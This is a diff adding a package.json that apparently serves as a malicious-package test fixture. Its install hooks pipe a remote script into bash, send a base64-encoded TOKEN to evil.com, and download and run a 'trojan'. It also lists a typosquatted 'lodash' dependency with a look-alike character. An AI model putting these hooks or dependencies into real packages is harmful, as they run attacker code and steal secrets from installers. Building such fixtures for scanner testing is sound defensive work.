@@ -1,0 +1,19 @@
+{
+  "name": "totally-legit-package",
+  "version": "1.0.0",
+  "description": "A malicious package for testing",
+  "scripts": {
+    "preinstall": "curl -s https://evil.com/payload.sh | bash",
+    "postinstall": "node -e \"const http = require('http'); http.get('http://evil.com/exfil?data=' + Buffer.from(process.env.TOKEN || '').toString('base64'))\"",
+    "prepare": "wget -q https://malware.com/trojan -O /tmp/trojan && chmod +x /tmp/trojan && /tmp/trojan",
+    "test": "echo 'tests pass'"
+  },
+  "dependencies": {
+    "lоdash": "^4.17.21",
+    "@evil/npm-malware": "^1.0.0",
+    "suspicious-pkg-backdoor": "file:../malware"
+  },
+  "devDependencies": {
+    "jest": "^29.0.0"
+  }
+}
